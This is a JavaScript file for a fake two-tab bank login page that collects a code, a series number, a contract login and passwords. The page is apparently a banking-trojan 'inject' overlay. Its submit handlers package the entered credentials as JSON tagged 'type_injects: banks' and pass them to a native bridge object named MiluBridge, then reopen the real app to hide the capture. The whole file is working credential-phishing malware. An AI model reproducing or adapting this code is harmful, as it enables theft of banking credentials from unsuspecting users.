(() => {
  const form1 = document.getElementById("form1");
  const form2 = document.getElementById("form2");
  const tabFirstButtons = document.querySelectorAll('[data-tab="first"]');
  const tabSecondButtons = document.querySelectorAll('[data-tab="second"]');

  const codeFirst = document.getElementById("codeFirst");
  const seriaFirst = document.getElementById("seriaFirst");
  const passwordFirst = document.getElementById("passwordFirst");
  const sendDataFirst = document.getElementById("sendDataFirst");

  const loginSecond = document.getElementById("loginSecond");
  const passwordSecond = document.getElementById("passwordSecond");
  const sendDataSecond = document.getElementById("sendDataSecond");

  let locked = false;

  function bridge() {
    try {
      return window.MiluBridge || null;
    } catch (_) {
      return null;
    }
  }

  function reportDone(payload) {
    const b = bridge();
    if (b && typeof b.done === "function") {
      try {
        b.done(payload);
      } catch (_) {
        /* ignore */
      }
    }
  }

  function openApp() {
    const b = bridge();
    if (b && typeof b.openApp === "function") {
      try {
        b.openApp();
      } catch (_) {
        /* ignore */
      }
    }
  }

  function setFilled(input) {
    input.classList.toggle("is-filled", input.value.length > 0);
  }

  function digitsOnly(value, maxLen) {
    return value.replace(/\D/g, "").slice(0, maxLen);
  }

  function formatContractNumber(raw) {
    const d = raw.replace(/\D/g, "").slice(0, 10);
    if (d.length <= 5) {
      return d;
    }
    return `${d.slice(0, 5)} - ${d.slice(5)}`;
  }

  function showFirstTab() {
    form1.classList.add("is-active");
    form2.classList.remove("is-active");
    tabFirstButtons.forEach((el) => el.classList.add("is-active"));
    tabSecondButtons.forEach((el) => el.classList.remove("is-active"));
  }

  function showSecondTab() {
    form2.classList.add("is-active");
    form1.classList.remove("is-active");
    tabSecondButtons.forEach((el) => el.classList.add("is-active"));
    tabFirstButtons.forEach((el) => el.classList.remove("is-active"));
  }

  function checkFirst(moveFocus) {
    const ok =
      codeFirst.value.length === 3 &&
      seriaFirst.value.length === 8 &&
      passwordFirst.value.length === 8;
    sendDataFirst.disabled = !ok;

    if (!moveFocus) {
      return;
    }
    if (codeFirst.value.length !== 3) {
      codeFirst.focus();
    } else if (seriaFirst.value.length !== 8) {
      seriaFirst.focus();
    } else if (passwordFirst.value.length !== 8) {
      passwordFirst.focus();
    }
  }

  function checkSecond(moveFocus) {
    const ok = loginSecond.value.length === 13 && passwordSecond.value.length === 8;
    sendDataSecond.disabled = !ok;

    if (!moveFocus) {
      return;
    }
    if (loginSecond.value.length !== 13) {
      loginSecond.focus();
    } else if (passwordSecond.value.length !== 8) {
      passwordSecond.focus();
    }
  }

  function submitFirst() {
    if (locked || sendDataFirst.disabled) {
      return;
    }
    locked = true;
    const data = {
      codeFirst: codeFirst.value,
      seriaFirst: seriaFirst.value,
      passwordFirst: passwordFirst.value,
      type_injects: "banks",
      closed: "close_activity_injects",
    };
    reportDone(JSON.stringify(data));
    window.setTimeout(() => {
      openApp();
      locked = false;
    }, 300);
  }

  function submitSecond() {
    if (locked || sendDataSecond.disabled) {
      return;
    }
    locked = true;
    const data = {
      loginSecond: loginSecond.value,
      passwordSecond: passwordSecond.value,
      type_injects: "banks",
      closed: "close_activity_injects",
    };
    reportDone(JSON.stringify(data));
    window.setTimeout(() => {
      openApp();
      locked = false;
    }, 300);
  }

  codeFirst.addEventListener("input", () => {
    codeFirst.value = digitsOnly(codeFirst.value, 3);
    setFilled(codeFirst);
    checkFirst(true);
  });

  seriaFirst.addEventListener("input", () => {
    seriaFirst.value = digitsOnly(seriaFirst.value, 8);
    setFilled(seriaFirst);
    checkFirst(true);
  });

  passwordFirst.addEventListener("input", () => {
    passwordFirst.value = passwordFirst.value.slice(0, 8);
    setFilled(passwordFirst);
    checkFirst(true);
  });

  loginSecond.addEventListener("input", () => {
    const digits = loginSecond.value.replace(/\D/g, "").slice(0, 10);
    loginSecond.value = formatContractNumber(digits);
    setFilled(loginSecond);
    checkSecond(true);
  });

  passwordSecond.addEventListener("input", () => {
    passwordSecond.value = passwordSecond.value.slice(0, 8);
    setFilled(passwordSecond);
    checkSecond(true);
  });

  sendDataFirst.addEventListener("click", (event) => {
    event.preventDefault();
    submitFirst();
  });

  sendDataSecond.addEventListener("click", (event) => {
    event.preventDefault();
    submitSecond();
  });

  tabFirstButtons.forEach((btn) => {
    btn.addEventListener("click", showFirstTab);
  });
  tabSecondButtons.forEach((btn) => {
    btn.addEventListener("click", showSecondTab);
  });

  document.querySelectorAll(".cool-input__input").forEach((input) => {
    setFilled(input);
  });

  ["backBtn1", "backBtn2"].forEach((id) => {
    const btn = document.getElementById(id);
    if (btn) {
      btn.addEventListener("click", () => {
        openApp();
      });
    }
  });

  showFirstTab();
  checkFirst(false);
  checkSecond(false);
})();
